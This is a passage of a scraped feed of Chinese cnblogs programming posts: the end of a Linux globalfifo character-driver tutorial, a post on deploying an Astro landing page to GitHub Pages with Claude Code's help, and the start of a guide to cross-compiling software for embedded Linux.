remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n            set_current_state(TASK_RUNNING);\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;\n        }\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 4.将进程状态改为可打断睡眠</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">        __set_current_state(TASK_INTERRUPTIBLE);\n        up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 5.调度其他进程（真正睡眠）</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">        schedule();\n\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 6.若因为信号唤醒，则返回让上层完成错误处理</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">if</span><span style=\"color: rgba(0, 0, 0, 1);\"> (signal_pending(current)) {\n            ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">ERESTARTSYS;\n            remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n            set_current_state(TASK_RUNNING);\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;\n        }\n        down(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n    }\n\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span> (count &gt; GLOBALFIFO_SIZE - dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">current_len)\n        count </span>= GLOBALFIFO_SIZE - dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">current_len;\n\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span> (copy_from_user(dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">mem, buf, count)) {\n        ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EFAULT;\n        up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n        remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n        set_current_state(TASK_RUNNING);\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;\n    } </span><span style=\"color: rgba(0, 0, 255, 1);\">else</span><span style=\"color: rgba(0, 0, 0, 1);\"> {\n        dev</span>-&gt;current_len +=<span style=\"color: rgba(0, 0, 0, 1);\"> count;\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 唤醒等待队列</span>\n        wake_up_interruptible(&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">r_wait);\n        ret </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> count;    \n    }\n\n    up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n    remove_wait_queue(</span>&amp;dev-&gt;w_wait, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">wait);\n    set_current_state(TASK_RUNNING);\n\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> count;\n}\n\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> user lseek fd </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">static</span> loff_t globalfifo_llseek(<span style=\"color: rgba(0, 0, 255, 1);\">struct</span> file* filp, loff_t offset, <span style=\"color: rgba(0, 0, 255, 1);\">int</span><span style=\"color: rgba(0, 0, 0, 1);\"> orig) {\n    loff_t ret;\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">switch</span><span style=\"color: rgba(0, 0, 0, 1);\">(orig) {\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 从起始位置开始移动指针</span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">case</span> <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">:\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span>(offset &lt; <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">) {\n            ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EINVAL;\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">break</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n        }\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span>((unsigned <span style=\"color: rgba(0, 0, 255, 1);\">int</span>)offset &gt;<span style=\"color: rgba(0, 0, 0, 1);\"> GLOBALFIFO_SIZE) {\n            ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EINVAL;\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">break</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n        }\n        filp</span>-&gt;f_pos = (unsigned <span style=\"color: rgba(0, 0, 255, 1);\">int</span><span style=\"color: rgba(0, 0, 0, 1);\">)offset;\n        ret </span>= filp-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">f_pos;\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">break</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 从当前位置开始移动指针</span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">case</span> <span style=\"color: rgba(128, 0, 128, 1);\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">:\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span>((filp-&gt;f_pos + offset) &gt;<span style=\"color: rgba(0, 0, 0, 1);\"> GLOBALFIFO_SIZE) {\n            ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EINVAL;\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">break</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n        }\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span>((filp-&gt;f_pos + offset) &lt; <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">) {\n            ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EINVAL;\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">break</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n        }\n        filp</span>-&gt;f_pos +=<span style=\"color: rgba(0, 0, 0, 1);\"> offset;\n        ret </span>= filp-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">f_pos;\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">break</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">default</span><span style=\"color: rgba(0, 0, 0, 1);\">:\n        ret </span>= -<span style=\"color: rgba(0, 0, 0, 1);\">EINVAL;\n    }\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> ret;\n}\n\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> user ioctl fd </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">long</span> globalfifo_unlocked_ioctl(<span style=\"color: rgba(0, 0, 255, 1);\">struct</span> file *filp, unsigned <span style=\"color: rgba(0, 0, 255, 1);\">int</span> cmd, unsigned <span style=\"color: rgba(0, 0, 255, 1);\">long</span><span style=\"color: rgba(0, 0, 0, 1);\"> arg){\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 获取设备结构体指针    </span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">struct</span> globalfifo_dev* dev = filp-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">private_data;    \n    \n    </span><span style=\"color: rgba(0, 0, 255, 1);\">switch</span><span style=\"color: rgba(0, 0, 0, 1);\">(cmd) {\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">case</span><span style=\"color: rgba(0, 0, 0, 1);\"> MEM_CLEAR:\n        down(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n        dev</span>-&gt;current_len = <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n        memset(dev</span>-&gt;mem, <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">, GLOBALFIFO_SIZE);\n        up(</span>&amp;dev-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">sem);\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">break</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">default</span><span style=\"color: rgba(0, 0, 0, 1);\">:\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span> -<span style=\"color: rgba(0, 0, 0, 1);\">EINVAL;\n    }\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span> <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n}\n\n\n\n</span><span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">const</span> <span style=\"color: rgba(0, 0, 255, 1);\">struct</span> file_operations globalfifo_fops =<span style=\"color: rgba(0, 0, 0, 1);\"> {\n    .owner </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> THIS_MODULE,\n    .open </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_open,\n    .release </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_release,\n    .llseek </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_llseek,\n    .read </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_read,\n    .write </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_write,\n    .unlocked_ioctl </span>=<span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_unlocked_ioctl\n};\n\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">/*</span><span style=\"color: rgba(0, 128, 0, 1);\"> 设备驱动模块insmod加载函数 </span><span style=\"color: rgba(0, 128, 0, 1);\">*/</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">int</span> globalfifo_init(<span style=\"color: rgba(0, 0, 255, 1);\">void</span><span style=\"color: rgba(0, 0, 0, 1);\">) {\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 向 Linux 内核中注册字符设备编号范围</span>\n    register_chrdev_region(MKDEV(globalfifo_major, <span style=\"color: rgba(128, 0, 128, 1);\">0</span>), <span style=\"color: rgba(128, 0, 128, 1);\">1</span>, <span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">globalfifo</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 为设备以及共享内存分配内存</span>\n    globalfifo_devp = kmalloc(<span style=\"color: rgba(0, 0, 255, 1);\">sizeof</span>(<span style=\"color: rgba(0, 0, 255, 1);\">struct</span><span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_dev), GFP_KERNEL);\n    memset(globalfifo_devp, </span><span style=\"color: rgba(128, 0, 128, 1);\">0</span>, <span style=\"color: rgba(0, 0, 255, 1);\">sizeof</span>(<span style=\"color: rgba(0, 0, 255, 1);\">struct</span><span style=\"color: rgba(0, 0, 0, 1);\"> globalfifo_dev));\n    \n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 初始化字符设备0的基本字段</span>\n    cdev_init(&amp;globalfifo_devp-&gt;m_cdev, &amp;<span style=\"color: rgba(0, 0, 0, 1);\">globalfifo_fops);\n    globalfifo_devp</span>-&gt;m_cdev.owner =<span style=\"color: rgba(0, 0, 0, 1);\"> THIS_MODULE;\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 将主设备号globalfifo_major次设备号0，与字符设备驱动的关联</span>\n    cdev_add(&amp;globalfifo_devp-&gt;m_cdev, MKDEV(globalfifo_major, <span style=\"color: rgba(128, 0, 128, 1);\">0</span>), <span style=\"color: rgba(128, 0, 128, 1);\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 初始化信号量</span>\n    sema_init(&amp;globalfifo_devp-&gt;sem, <span style=\"color: rgba(128, 0, 128, 1);\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 初始化读写等待队列头</span>\n    init_waitqueue_head(&amp;globalfifo_devp-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">r_wait);\n    init_waitqueue_head(</span>&amp;globalfifo_devp-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">w_wait);\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span> <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n}\n\n\n</span><span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">void</span> globalfifo_exit(<span style=\"color: rgba(0, 0, 255, 1);\">void</span><span style=\"color: rgba(0, 0, 0, 1);\">) {\n    dev_t devno;\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 注销cdev</span>\n    cdev_del(&amp;globalfifo_devp-&gt;<span style=\"color: rgba(0, 0, 0, 1);\">m_cdev);\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 释放设备结构体内存</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">    kfree(globalfifo_devp);    \n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 释放设备号</span>\n    devno = MKDEV(globalfifo_major, <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n    unregister_chrdev_region(devno, </span><span style=\"color: rgba(128, 0, 128, 1);\">1</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n}\n\n\nMODULE_AUTHOR(</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">cear</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">);\nMODULE_LICENSE(</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">GPL</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n\nmodule_param(globalfifo_major, </span><span style=\"color: rgba(0, 0, 255, 1);\">int</span><span style=\"color: rgba(0, 0, 0, 1);\">, S_IRUGO);\nmodule_init(globalfifo_init);\nmodule_exit(globalfifo_exit);</span></pre>\n</div>\n<p>&nbsp;</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-16 09:51</span>&nbsp;\n<a href=\"https://www.cnblogs.com/cear\">cear</a>&nbsp;\n阅读(<span id=\"post_view_count\">3</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Claude Code配合Astro + GitHub Pages：为 sharelatex-ce 打造现代化的开源项目宣传页",
      "link": "https://www.cnblogs.com/xuhe2/p/19618589",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/xuhe2/p/19618589\" id=\"cb_post_title_url\" title=\"发布于 2026-02-15 21:51\">\n    <span>Claude Code配合Astro + GitHub Pages：为 sharelatex-ce 打造现代化的开源项目宣传页</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"效果\">效果</h1>\n<p>开源项目宣传页: <a href=\"https://xuhe2.github.io/sharelatex-ce/\" rel=\"noopener nofollow\" target=\"_blank\">https://xuhe2.github.io/sharelatex-ce/</a></p>\n<blockquote>\n<p>因为自建协作环境不该比写论文本身还难，所以我做了 sharelatex-ce 来实现真正的“一键式” Overleaf 私有化部署体验。</p>\n</blockquote>\n<p>实现效果:<br />\n<img alt=\"PixPin_2026-02-15_21-33-47\" class=\"lazyload\" /></p>\n<h1 id=\"为什么需要一个好看的宣传页\">为什么需要一个好看的宣传页？</h1>\n<p>说实话，程序员眼里的“美”往往很纯粹：代码整洁、架构优雅、README 文档清晰。但现实是残酷的——如果你的开源项目只有一堆冷冰冰的代码和长篇累牍的 Markdown 说明，那它就像是一个穿着睡衣去参加晚宴的天才，即便满腹经纶，也很难在第一时间抓住别人的眼球。</p>\n<p>在这个“颜值即正义”的 GitHub 时代，宣传页（Landing Page）就是项目的脸面。 它不仅能让用户在 3 秒钟内明白你的项目是干什么的，更像是一种“专业背书”。一个精致的页面在无声地告诉访问者：“看，开发者连这种细枝末节都打磨得这么认真，代码质量肯定差不了。” <strong>毕竟，大家都很忙，比起啃文档，谁不希望能一眼看到那个闪闪发光的 Docker-compose up 按钮呢？</strong></p>\n<h1 id=\"技术选型-后端人ai-干-前端\">技术选型: 后端人+AI 干 前端</h1>\n<p>作为一名后端程序员，让我手写 CSS 布局简直是某种程度上的“酷刑”。但在 2026 年，如果你还觉得做网页得从 </p><div> 开始一行行抠代码，那可能真的错过了这个时代的红利。<p></p>\n<p>我的选型逻辑非常直接：<strong>AI擅长什么框架, 我选什么框架, 让专业的人干专业的事，让 AI 干累人的事</strong></p>\n<ul>\n<li>\n<p>Astro 框架： 为什么不选 React 或 Vue？因为我不需要一个沉重的单页应用。Astro 是为内容驱动型网站而生的，它极快、极简，生成的静态页面干净得像刚刚洗过的代码。最重要的是，它对 SEO 极其友好，且支持各种组件混合，“学术范儿”十足。</p>\n</li>\n<li>\n<p>Claude Code： 这才是本次部署的秘密武器。作为一个非前端程序员，我只需要把我的需求、项目定位、甚至是喜欢的配色方案(<strong>其实我压根没有审美, AI看着来就好了, AI味? 我会受着</strong>)丢给 Claude。它不仅帮我写出了像模像样的 UI，甚至连那些弯弯绕绕的 GitHub Actions 部署逻辑都安排得明明白白。</p>\n</li>\n<li>\n<p>AI 时代的开发范式, 现在的开发逻辑已经变了吗? 我压根不了解 Tailwind 类名，我只需要扮演好“产品经理”的角色，通过简短的提示词（Prompt）指挥 AI 进行构建(<strong>实现细节? 相信AI的审美, 反正肯定比我好</strong>)。“不是前端写不起，而是 Claude 更有性价比。”</p>\n</li>\n</ul>\n<h1 id=\"开启github-pages功能\">开启Github Pages功能</h1>\n<ol>\n<li>\n<p>进入设置：在项目仓库顶栏点击 Settings。</p>\n</li>\n<li>\n<p>定位功能：左侧侧边栏找到并点击 Pages 选项。</p>\n</li>\n<li>\n<p>配置来源：在 Build and deployment -&gt; Source 中选择 Deploy from a branch。</p>\n</li>\n<li>\n<p>选定路径：在 Branch 下拉菜单选择目标分支（如 gh-pages），路径保持 / (root)。</p>\n</li>\n<li>\n<p>生效访问：点击 Save。稍等片刻，页面顶部会出现绿色的访问 URL。</p>\n</li>\n</ol>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<blockquote>\n<p>点击<code>Settings</code></p>\n</blockquote>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<h1 id=\"部署的宣传页出现了资源无法加载的问题\">部署的宣传页出现了资源无法加载的问题</h1>\n<h2 id=\"原因\">原因</h2>\n<p>GitHub Pages 默认使用 Jekyll 来构建网页。在 Jekyll 的规则中，任何以下划线 _ 开头的文件夹（例如 _astro/）都会被视为内部私有文件夹，不会被发布到服务器上。</p>\n<p>由于 Astro 默认将所有的 CSS 和 JS 文件放在 _astro/ 目录下，GitHub Pages 实际上并没有把这些文件部署出去，所以你的浏览器请求时会报 404。</p>\n<h2 id=\"解决方案1\">解决方案1</h2>\n<ul>\n<li>核心解决方法：添加 .nojekyll 文件</li>\n</ul>\n<blockquote>\n<p>你需要告诉 GitHub：“不要用 Jekyll 运行我的网站，直接把我的文件原样发出去”。</p>\n</blockquote>\n<p>操作步骤：</p>\n<ol>\n<li>在你的 gh-pages 分支的根目录下，创建一个名为 .nojekyll 的空文件（注意前面有一个点）。</li>\n<li>提交并推送。</li>\n</ol>\n<h2 id=\"解决方案2\">解决方案2</h2>\n<p>修改代码, 配置静态资源所在的位置, 修改<code>astro.config.mjs</code>文件内容:</p>\n<pre><code>diff --git a/landing-page/astro.config.mjs b/landing-page/astro.config.mjs\nindex 1ae7417..b1f04c3 100644\n--- a/landing-page/astro.config.mjs\n+++ b/landing-page/astro.config.mjs\n@@ -7,5 +7,6 @@ export default defineConfig({\n   site: 'https://xuhe2.github.io/sharelatex-ce/',\n   build: {\n     format: 'directory',\n+    assets: 'assets',\n   },\n });\n</code></pre>\n<h1 id=\"参考文献\">参考文献</h1>\n<p>官方文档: <a href=\"https://docs.github.com/en/pages/getting-started-with-github-pages/what-is-github-pages\" rel=\"noopener nofollow\" target=\"_blank\">https://docs.github.com/en/pages/getting-started-with-github-pages/what-is-github-pages</a></p>\n</div>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-15 21:51</span>&nbsp;\n<a href=\"https://www.cnblogs.com/xuhe2\">xuhe2</a>&nbsp;\n阅读(<span id=\"post_view_count\">39</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "嵌入式Linux手动交叉编译开源软件需要注意的问题",
      "link": "https://www.cnblogs.com/ttkwzyttk/p/19618661",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/ttkwzyttk/p/19618661\" id=\"cb_post_title_url\" title=\"发布于 2026-02-15 20:48\">\n    <span>嵌入式Linux手动交叉编译开源软件需要注意的问题</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        该文章主要提到了一些常见的编译错误及其解决方案，并提供了一些最佳实践，帮助开发者避免编译过程中的陷阱。通过这些建议，读者能够更高效地进行嵌入式Linux开发，减少编译和调试的时间。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>在嵌入式Linux的开发过程中，我们经常需要用到一些软件库或者是测试工具，这些库和工具大概率都是x86平台上开发的，就需要我们通过对源码进行交叉编译，生成能够在开发板上使用的软件和动态库。</p>\n<p>对于某些开源软件进行编译有两种情况，第一种是如果我们使用buildroot根文件系统，可以在buildroot的<code>menuconfig</code>编译菜单中，勾选相应的软件，重新编译根文件系统，编译完成之后该根文件系统就会自动带上对应的库和可执行程序，第二种是buildroot中无法找到我们需要的软件，这种情况下，只能够进行手动交叉编译，接下具体讲解下手动交叉编译开源软件可能遇到的一些问题</p>\n<h1 id=\"一使用交叉编译工具链时常见问题\">一、使用交叉编译工具链时常见问题</h1>\n<h2 id=\"11-编译过程中头文件相关问题\">1.1 编译过程中头文件相关问题</h2>\n<p>交叉编译时我们可能会遇到找不到头文件的问题，我们都知道在x86平台上开发程序，程序中通过尖括号的方式包含头文件：<code>#include &lt;xxx.h&gt;</code>他会到系统目录下去查找所需要的头文件，一般情况在<code>/usr/include</code>或者<code>/usr/local/include</code>路径下，那么对于我们的交叉编译工具的系统目录又是哪里呢，我们可以通过以下命令来查看当前交叉编译工具对应的<code>include</code>系统路径在哪</p>\n<pre><code class=\"language-c\">echo 'main(){}' | &lt;交叉编译工具&gt; -E -v -\n</code></pre>\n<p>这个命令利用 <code>gcc</code> 的预处理（<code>-E</code>）和详细输出（<code>-v</code>）功能，帮助查看编译器查找头文件和库文件的路径。适用于调试和理解交叉编译器的工作原理，尤其是在处理不同平台和工具链时。下面在我的平台中举例，我使用rk3576的SDK中自带的交叉编译工具，执行如上命令之后，输出结果如下图所示<br />\n<img alt=\"Pasted image 20260215184437.png\" src=\"https://img2024.cnblogs.com/blog/2652772/202602/2652772-20260215204541237-2069199422.png\" /><br />\n可以看见，该命令将<code>#include \"\"</code>和<code>#include &lt;&gt;</code>会查找的路径都打印了出来，对于源文件中通过<code>#include \"\"</code>的头文件，该编译器会到源文件当前路径下查找，对与原文件中通过<code>#include &lt;&gt;</code>的头文件，<code>aarch64-none-linux-gnuu-gcc</code>编译器会去以下三个路径中去查找，而不是x86平台下的系统路径中去查找。如果在我们交叉编译过程中，缺少某些头文件，我们就可以把对应头文件拷贝到这些目录中去，放到任意一个路径下就行。</p>\n<pre><code class=\"language-shell\">/home/wzy/sdk/rk3576_linux6.1.99_release-rkr5/prebuilts/gcc/linux-x86/aarch64/gcc-arm-10.3-2021.07-x86_64-aarch64-none-linux-gnu/bin/../lib/gcc/aarch64-none-linux-gnu/10.3.1/include  \n/home/wzy/sdk/rk3576_linux6.1.99_release-rkr5/prebuilts/gcc/linux-x86/aarch64/gcc-arm-10.3-2021.07-x86_64-aarch64-none-linux-gnu/bin/../lib/gcc/aarch64-none-linux-gnu/10.3.1/include-fixed  \n/home/wzy/sdk/rk3576_linux6.1.99_release-rkr5/prebuilts/gcc/linux-x86/aarch64/gcc-arm-10.3-2021.07-x86_64-aarch64-none-linux-gnu/bin/../lib/gcc/aarch64-none-linux-gnu/10.3.1/../../../../aarch64-none-linux-gnu/inclu  \nde\n</code></pre>\n<p>除了上面这种方法，也可以直接在编译源文件的时候在后面加上<code>-v</code>选项查看详细的编译信息，例如我这里编译一个usb相关的应用程序，下面是我执行交叉编译的命令，后面加上了<code>-v</code>来显示具体的编译信息</p>\n<pre><code class=\"language-shell\">/home/wzy/sdk/rk3576_linux6.1.99_release-rkr5/prebuilts/gcc/linux-x86/aarch64/gcc-arm-10.3-2021.07-x86_64-aarch64-none-linux-gnu/bin/aarch64-none-linux-gnu-gcc usb1.c -o usb1 -v\n</code></pre>\n<p>执行结果如下<br />\n<img alt=\"Pasted image 20260215203358.png\" src=\"https://img2024.cnblogs.com/blog/2652772/202602/2652772-20260215204541189-1040648713.png\" /><br />\n这里可以看见上面所讲的交叉编译工具的头文件系统路径，同时也报出一个错误，无法找到<code>libusb.h</code>文件，因为我没有吧对应头文件拷贝到红框中的任何一个头文件路径中去，也没有通过<code>-I</code>命令手动指定。接下来我将通过手动指定的方式来展示加了这个选项之后的变化。</p>\n<p>上面提到了除了使用系统目录外，也可以自己指定目录：编译时用<code>-I&lt;path&gt;</code>选项指定。编译时，编译器会优先使用通过<code>-I</code>指定的路径，因为如果指定了<code>-I</code>选项，该选项的路径会放到最前面，接着上面的报错，我加入了<code>-I</code>选项之后<br />\n<img alt=\"Pasted image 20260215203743.png\" src=\"https://img2024.cnblogs.com/blog/2652772/202602/2652772-20260215204541172-1625023185.png\" /><br />\n可以看见<code>-I</code>选项指定的路径优先级排到了最前面</p>\n<h2 id=\"12-编译过程中库文件问题\">1.2 编译过程中库文件问题</h2>\n<p>在交叉编译链接程序时如果有这样的提示：<code>undefined reference to xxx</code>，它表示 <code>xxx</code> 函数未定义。出现这个错误主要是有两种情况，第一就是交叉编译工具的系统库文件路径中没有相应的库，第二就是编译源码使用的库的版本和当前系统中库的版本不同，库的差异导致报错。解决方法要么去写出这个函数，或是使用库函数，那需要在链接时指定库。那么我们如何确定交叉编译工具对应的系统库文件在哪里？同样执行相同命令确定目录</p>\n<pre><code class=\"language-c\">echo 'main(){}' | &lt;交叉编译工具&gt; -E -v -\n</code></pre>\n<p>当然也可以在编译命令后加上<code>-v</code>选项<br />\n<img alt=\"Pasted image 20260215185448.png\" src=\"https://img2024.cnblogs.com/blog/2652772/202602/2652772-20260215204541242-413123482.png\" /><br 